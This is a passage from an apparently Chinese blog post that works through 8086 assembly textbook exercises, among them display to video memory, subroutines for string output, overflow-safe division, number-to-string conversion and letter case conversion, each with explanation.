class="symbol">s1:</span>    <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">s2:</span>    <span class="keyword">jmp</span> short s1</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>分析：<br>这个程序可以正确返回，程序的入口为mov ax, 0，注意到指令jmp short s1占2字节，于是指令mov di, offset s将s的偏移地址传送到寄存器DI，mov si, offset s2将s2的偏移地址传送到SI，然后再通过通用寄存器ax做中转将s2处的指令复制到s处，最后再跳转至s处执行复制过来的指令。<br>注意jmp short s1是相对跳转，其直接修改IP寄存器，从s2到s1共有8个字节的偏移，实际上 jmp short s1等价于(ip)=(ip)-8，通过Debug可知第一个nop指令的偏移地址为8，所以再执行了复制过的指令后，IP将指向0，程序按照顺序执行mov ax, 4c00h和int 21h，正确返回。</p>
<h2 id="实验9-根据材料编程"><a href="#实验9-根据材料编程" class="headerlink" title="实验9 根据材料编程"></a>实验9 根据材料编程</h2><p>编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串’welcome to masm!’。<br>编程所需的只是通过阅读、分析下面的材料获得。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">ds</span>:data, <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'welcome to masm!'</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0B800H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1664</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></span><br><span class="line"><span class="symbol">char1:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">10000010B</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> char1</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1824</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></span><br><span class="line"><span class="symbol">char2:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">10100100B</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> char2</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1984</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></span><br><span class="line"><span class="symbol">char3:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">11110001B</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> char3</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4C00H</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21H</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
<h2 id="实验10-编写子程序"><a href="#实验10-编写子程序" class="headerlink" title="实验10 编写子程序"></a>实验10 编写子程序</h2><ol>
<li><p>显示字符串</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'Welcome to masm!'</span>, <span class="number">0</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">3</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span> show_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">show_str:</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="comment">;using cx, bx, ax, si, di, es</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></span><br><span class="line"><span class="keyword">mul</span> <span class="number">dh</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">dl</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">;bx stores address of start character</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span> <span class="comment">;al stores the color of character</span></span><br><span class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">jmp</span> char</span><br><span class="line"><span class="symbol">zero:</span>   <span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决除法溢出的问题</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4240h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">000fh</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">0ah</span></span><br><span class="line"><span class="keyword">call</span> divdw</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">divdw:</span>  <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">; bx stores L</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span> <span class="comment">; ax stores H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">cx</span> <span class="comment">; after div, ax holds int(H/N), dx holds rem(H/N)</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">; push int(H/N) temporarily</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span> <span class="comment">; ax stores L</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
<li><p>数值显示</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">10</span> dup (<span class="number">0</span>)</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">12666</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span> dtoc</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">3</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">call</span> show_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">dtoc:</span>   <span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">devide:</span> <span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">jcxz</span> stop</span><br><span class="line"><span class="keyword">div</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">jmp</span> devide</span><br><span class="line"><span class="symbol">stop:</span>   <span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">di</span></span><br><span class="line"><span class="symbol">string:</span> <span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">si</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">show_str:</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="comment">;using cx, bx, ax, si, di, es</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></span><br><span class="line"><span class="keyword">mul</span> <span class="number">dh</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">dl</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">;bx stores address of start character</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span> <span class="comment">;al stores the color of character</span></span><br><span class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">jmp</span> char</span><br><span class="line"><span class="symbol">zero:</span>   <span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验11-编写子程序"><a href="#实验11-编写子程序" class="headerlink" title="实验11 编写子程序"></a>实验11 编写子程序</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">"Beginner's All-purpose Symbolic Instruction Code."</span>, <span class="number">0</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">begin:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span> letterc</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">letterc:</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pushf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">97</span></span><br><span class="line"><span class="keyword">jb</span> next</span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">122</span></span><br><span class="line"><span class="keyword">ja</span> next</span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">cl</span>, <span class="number">20h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">si</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">next:</span>   <span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">jmp</span> start</span><br><span class="line"></span><br><span class="line"><span class="symbol">zero:</span>   <span class="keyword">popf</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end begin</span><br></pre></td></tr></table></figure>
